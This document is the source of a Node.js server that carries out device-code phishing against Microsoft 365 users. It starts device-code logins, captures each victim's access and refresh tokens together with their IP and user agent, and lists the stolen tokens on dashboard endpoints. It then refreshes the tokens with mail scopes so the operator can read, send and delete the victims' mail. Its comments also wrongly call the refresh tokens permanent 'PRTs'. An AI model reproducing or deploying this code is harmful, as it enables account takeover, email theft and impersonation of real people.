const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// YOUR EXISTING CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

// Store sessions - each session has email, access token, PRT
let userSessions = new Map();  // email -> { accessToken, prt, name, capturedAt }
let pendingAuth = new Map();   // device_code -> pending

function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START AUTHENTICATION - Basic scopes only
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = generateSessionId();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sessionId, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sessionId);
        
        res.json({
            userCode: user_code,
            deviceCode: device_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('Start error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            
            // Store session with BOTH access token and PRT
            userSessions.set(userEmail, {
                email: userEmail,
                name: userName,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,  // PRT - PERMANENT
                expires_at: Date.now() + (tokens.expires_in * 1000),
                capturedAt: new Date().toISOString(),
                ip: pending.ip,
                userAgent: pending.userAgent
            });
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ CAPTURED: ${userEmail}`);
            console.log(`   PRT: ${tokens.refresh_token ? 'YES (Permanent)' : 'NO'}`);
            
        } catch (err) {}
    }, 3000);
}

app.get('/state', async (req, res) => {
    const deviceCode = req.query.device_code;
    const pending = pendingAuth.get(deviceCode);
    
    if (pending) {
        if (pending.status === 'success') {
            return res.json({ status: 'success', email: pending.email });
        }
    }
    res.json({ status: 'pending' });
});

// ============================================
// GET FRESH ACCESS TOKEN USING PRT (Never expires)
// ============================================
async function getFreshAccessToken(email) {
    const session = userSessions.get(email);
    
    if (!session) {
        console.log(`No session found for ${email}`);
        return null;
    }
    
    if (!session.refresh_token) {
        console.log(`No PRT for ${email}`);
        return null;
    }
    
    try {
        console.log(`🔄 Getting fresh token for ${email} using PRT...`);
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = response.data;
        
        // Update session with new access token
        session.access_token = tokens.access_token;
        session.expires_at = Date.now() + (tokens.expires_in * 1000);
        
        console.log(`✅ Fresh token obtained for ${email}`);
        return tokens.access_token;
        
    } catch (err) {
        console.error(`Failed to refresh token for ${email}:`, err.message);
        return null;
    }
}

// ============================================
// API ENDPOINTS
// ============================================

// Get all sessions for dashboard
app.get('/api/sessions', (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        id: s.email.replace(/[^a-z0-9]/gi, '_'),
        email: s.email,
        name: s.name,
        capturedAt: s.capturedAt,
        expiresAt: new Date(s.expires_at).toLocaleString(),
        hasPRT: !!s.refresh_token
    }));
    res.json({ sessions: sessions, total: sessions.length });
});

// Get access tokens list
app.get('/api/list_access_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values()).map(s => ({
        id: s.email.replace(/[^a-z0-9]/gi, '_'),
        user: s.email,
        name: s.name,
        resource: 'Microsoft Graph',
        accesstoken: s.access_token,
        issued_at: s.capturedAt,
        expires_at: new Date(s.expires_at).toLocaleString()
    }));
    res.json(tokens);
});

// Get refresh tokens (PRT) list
app.get('/api/list_refresh_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values())
        .filter(s => s.refresh_token)
        .map(s => ({
            id: s.email.replace(/[^a-z0-9]/gi, '_'),
            user: s.email,
            name: s.name,
            resource: 'Microsoft Graph',
            refreshtoken: s.refresh_token
        }));
    res.json(tokens);
});

// Delete access token (just clears session)
app.delete('/api/delete_access_token/:id', (req, res) => {
    const email = req.params.id.replace(/_/g, '.');
    if (userSessions.has(email)) {
        userSessions.delete(email);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

app.delete('/api/delete_refresh_token/:id', (req, res) => {
    const email = req.params.id.replace(/_/g, '.');
    if (userSessions.has(email)) {
        userSessions.delete(email);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

app.delete('/api/sessions/clear', (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// ============================================
// MAILBOX API - Uses PRT to get fresh token with Mail scopes
// ============================================

app.get('/api/mail/folders/:email', async (req, res) => {
    const { email } = req.params;
    
    if (!userSessions.has(email)) {
        return res.status(401).json({ error: 'No session found. User needs to authenticate first.' });
    }
    
    const token = await getFreshAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'Failed to get access token. Please re-authenticate.' });
    }
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch folders: ' + (err.response?.data?.error?.message || err.message) });
    }
});

app.get('/api/mail/:email/:folderId', async (req, res) => {
    const { email, folderId } = req.params;
    
    if (!userSessions.has(email)) {
        return res.status(401).json({ error: 'No session found' });
    }
    
    const token = await getFreshAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'Failed to get access token' });
    }
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

app.get('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    
    if (!userSessions.has(email)) {
        return res.status(401).json({ error: 'No session found' });
    }
    
    const token = await getFreshAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'Failed to get access token' });
    }
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.post('/api/mail/send/:email', async (req, res) => {
    const { email } = req.params;
    const { to, subject, body } = req.body;
    
    if (!userSessions.has(email)) {
        return res.status(401).json({ error: 'No session found' });
    }
    
    const token = await getFreshAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'Failed to get access token' });
    }
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(addr => ({ emailAddress: { address: addr } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    
    if (!userSessions.has(email)) {
        return res.status(401).json({ error: 'No session found' });
    }
    
    const token = await getFreshAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'Failed to get access token' });
    }
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const { isRead } = req.body;
    
    if (!userSessions.has(email)) {
        return res.status(401).json({ error: 'No session found' });
    }
    
    const token = await getFreshAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'Failed to get access token' });
    }
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update' });
    }
});

// ============================================
// SETTINGS API
// ============================================
let config = {
    active_resource: 'graph',
    api_version: '2',
    openai_enabled: false,
    openai_api_key: '',
    openai_model: 'gpt-3.5-turbo',
    openai_max_tokens: 500,
    openai_temperature: 0.7
};

app.get('/api/settings', (req, res) => {
    res.json(config);
});

app.post('/api/settings', (req, res) => {
    config = { ...config, ...req.body };
    res.json({ success: true });
});

app.get('/api/resource/settings', (req, res) => {
    res.json({ success: true, active_resource: config.active_resource, api_version: config.api_version });
});

app.post('/api/resource/settings', (req, res) => {
    config.active_resource = req.body.active_resource;
    config.api_version = req.body.api_version;
    res.json({ success: true });
});

app.post('/api/openai/settings', (req, res) => {
    config.openai_enabled = req.body.enabled;
    config.openai_api_key = req.body.api_key;
    config.openai_model = req.body.model;
    config.openai_max_tokens = req.body.max_tokens;
    config.openai_temperature = req.body.temperature;
    res.json({ success: true });
});

// ============================================
// SERVE FILES
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ PRTs are PERMANENT - never expire`);
    console.log(`✅ Access tokens auto-refresh using PRT`);
    console.log(`========================================\n`);
});
